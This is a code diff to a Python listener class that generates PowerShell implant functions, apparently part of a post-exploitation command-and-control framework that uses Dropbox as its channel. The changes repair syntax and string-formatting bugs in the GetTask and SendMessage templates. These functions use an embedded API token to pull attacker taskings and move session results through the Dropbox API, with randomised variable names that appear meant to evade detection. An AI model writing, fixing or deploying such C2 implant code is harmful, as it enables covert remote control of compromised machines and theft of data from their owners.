@@ -618,7 +618,7 @@ class Listener:
 
                 getTask = """
     $script:GetTask{name} = {{
-        params($FixedParameters) 
+        param($FixedParameters) 
         $APIToken = "{api_token}";
         try {{
             # build the web request object
@@ -631,7 +631,7 @@ class Listener:
                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
             }}
 
-            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent", $FixedParameters["headers"][User-Agent"])
+            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent", $FixedParameters["headers"]["User-Agent"])
             $FixedParameters["headers"].GetEnumerator() | ForEach-Object {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
 
             $TaskingsFolder = "{tasking_folder}"
@@ -651,7 +651,8 @@ class Listener:
         }}
     }}
 #TASK_FUNC
-                """.format(name = listenerOptions["Name"]["Value"], tasking_folder = taskingsFolder, api_token = apiToken)
+                """
+                getTask = getTask.format(name = listenerOptions["Name"]["Value"], tasking_folder = taskingsFolder, api_token = apiToken)
 
                 sendMessage = """
     $script:SendMessage{name} = {{
@@ -686,7 +687,7 @@ class Listener:
                 try {{
                     $Data = $Null
                     $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Authorization", "Bearer $($Script:APIToken)");
-                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
+                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Dropbox-API-Arg", "{{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}}");
                     $Data = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData("https://content.dropboxapi.com/2/files/download")
                 }}
                 catch {{ }}
@@ -712,16 +713,17 @@ class Listener:
         }}
     }}
 #TASK_FUNC
-                """.format(resultsFolder = resultsFolder, name = listenerOptions["Name"]["Value"], api_token = apiToken)
+                """
+                sendMessage = sendMessage.format(resultsFolder = resultsFolder, name = listenerOptions["Name"]["Value"], api_token = apiToken)
 
                 if deployed:
                     return ( "$script:NewListenerDict = {};".format(listener_dict) +
-                            getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']) +
-                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
+                            getTask +
+                            sendMessage)
                 else:
                     return (listener_dict,
-                            getTask.format(name = listenerOptions['Name']['Value']),
-                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
+                            getTask,
+                            sendMessage)
 
             elif language.lower() == 'python':
 
